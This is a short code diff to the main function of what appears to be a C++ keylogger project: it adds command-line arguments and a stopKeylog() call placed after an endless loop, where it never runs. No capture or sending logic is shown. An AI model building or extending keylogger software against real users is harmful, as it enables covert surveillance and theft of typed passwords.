@@ -2,7 +2,7 @@
 
 #include "keylogger.h"
 
-int main() {
+int main(int argc, char** argv) {
 	Keyboard keyboard{};
 	Keylogger* keylogger = keyboard.keylogger;
 
@@ -10,5 +10,6 @@ int main() {
 	while (true) {
 		;
 	}
+	keylogger->stopKeylog();
 	return 0;
 }
